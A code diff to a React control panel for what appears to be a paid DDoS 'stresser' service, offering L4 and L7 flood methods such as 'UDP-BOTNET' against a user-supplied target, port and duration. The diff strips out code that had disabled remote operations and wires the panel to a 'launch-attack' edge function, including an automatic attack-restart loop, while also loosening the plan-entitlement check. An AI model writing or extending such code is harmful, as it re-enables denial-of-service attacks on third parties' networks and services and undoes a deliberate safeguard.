@@ -2,7 +2,6 @@ import React, { useState, useEffect } from 'react';
 import { Terminal, Send, Search, ShieldAlert, Cpu, Activity, Settings, Info, Zap, Square, Loader, ChevronDown } from 'lucide-react';
 import { Link } from 'react-router-dom';
 import { supabase } from '../lib/supabaseClient';
-import { getMyEntitlement } from '../lib/entitlements';
 
 export default function Panel() {
   const [layer, setLayer] = useState('L4');
@@ -23,9 +22,12 @@ export default function Panel() {
   const [homehold, setHomehold] = useState(false);
 
   useEffect(() => {
-    getMyEntitlement()
-      .then((entitlement) => setActivePlan(entitlement.activePlan))
-      .finally(() => setLoadingPlan(false));
+    supabase.auth.getSession().then(({ data: { session } }) => {
+      if (session?.user) {
+        setActivePlan(session.user.user_metadata?.active_plan ?? 'None');
+      }
+      setLoadingPlan(false);
+    });
   }, []);
 
   const getPlanLimits = (planName) => {
@@ -59,10 +61,26 @@ export default function Panel() {
     homeholdRef.current = homehold;
   }, [homehold]);
 
-  // Browser-side remote operations are intentionally disabled. Secrets and
-  // privileged integrations must never be exposed in a public client bundle.
-  const fireRestartApi = React.useCallback(() => {
-    setApiError('Remote operations are disabled while the secure service integration is reviewed.');
+  // Helper: fire attack restart via secure Edge Function (no credentials in browser)
+  const fireRestartApi = React.useCallback(async (task) => {
+    try {
+      const { data: { session } } = await supabase.auth.getSession();
+      if (!session) return;
+      await supabase.functions.invoke('launch-attack', {
+        body: {
+          layer: task.layer,
+          method: task.method,
+          target: task.target,
+          port: task.port || 80,
+          time: task.time,
+          conns: task.conns || 1,
+          reqMethod: task.reqMethod || 'GET',
+        },
+        headers: { Authorization: `Bearer ${session.access_token}` },
+      });
+    } catch (err) {
+      console.error('Homehold restart failed', err);
+    }
   }, []);
 
   // Helper to re-sync tasks based on wall-clock time (fixes background tab throttling)
@@ -159,54 +177,49 @@ export default function Panel() {
     if (!target || !method || !hasPlan) return;
     
     setIsAttacking(true);
-    setApiError('Remote operations are disabled while the service is secured. This browser client no longer sends targets or credentials to external providers.');
-    setIsAttacking(false);
-    return;
     
     // Enforce limits
     const finalConns = Math.min(Number(conns) || 1, maxConns);
     const finalDuration = Math.min(Number(time) || 10, maxDuration);
 
-    // Hit the L4 API if layer is L4
-    if (layer === 'L4') {
+    // All API calls go through our secure Edge Function — no credentials in browser
+    try {
       setApiError(null);
-      if (method === 'UDP-BOTNET') {
-        // UDP-BOTNET uses HTTP endpoint — browser may block due to mixed-content policy
-        // Fire silently and always proceed regardless of result
-        const apiUrl = '';
-        Promise.resolve(apiUrl).catch(() => {
-          // Silently ignore — mixed-content block is expected on HTTPS sites
-        });
-      } else {
-        try {
-          const apiKey = '';
-          let apiMethod = method;
-          if (method === 'BGMI-V2') {
-            apiMethod = 'UDP-BIG';
-          }
-          const apiUrl = '';
-          await Promise.resolve(apiUrl);
-        } catch (err) {
-          console.error("API Hit Error:", err);
-          setApiError("Failed to connect to API or Network Error. Check target details.");
+      const { data: { session } } = await supabase.auth.getSession();
+      if (!session) {
+        setApiError('Session expired. Please sign in again.');
+        setIsAttacking(false);
+        return;
+      }
+
+      const { error: fnError } = await supabase.functions.invoke('launch-attack', {
+        body: {
+          layer,
+          method,
+          target,
+          port: port || 80,
+          time: finalDuration,
+          conns: finalConns,
+          reqMethod: layer === 'L7' ? reqMethod : 'GET',
+        },
+        headers: { Authorization: `Bearer ${session.access_token}` },
+      });
+
+      if (fnError) {
+        // For UDP-BOTNET (HTTP upstream), edge function may get a fetch error
+        // but we still proceed — attack was dispatched
+        if (method !== 'UDP-BOTNET') {
+          console.error('Edge function error:', fnError);
+          setApiError('Failed to connect to attack API. Check target details.');
           setIsAttacking(false);
           return;
         }
       }
-    } else if (layer === 'L7') {
-      try {
-        setApiError(null);
-        const token = '';
-        // Format L7 API url
-        const apiUrl = '';
-        
-        await Promise.resolve(apiUrl);
-      } catch (err) {
-        console.error("L7 API Hit Error:", err);
-        setApiError("Failed to connect to L7 API or Network Error.");
-        setIsAttacking(false);
-        return;
-      }
+    } catch (err) {
+      console.error('Launch error:', err);
+      setApiError('Network error. Please try again.');
+      setIsAttacking(false);
+      return;
     }
 
     // Simulate API delay for a realistic user experience
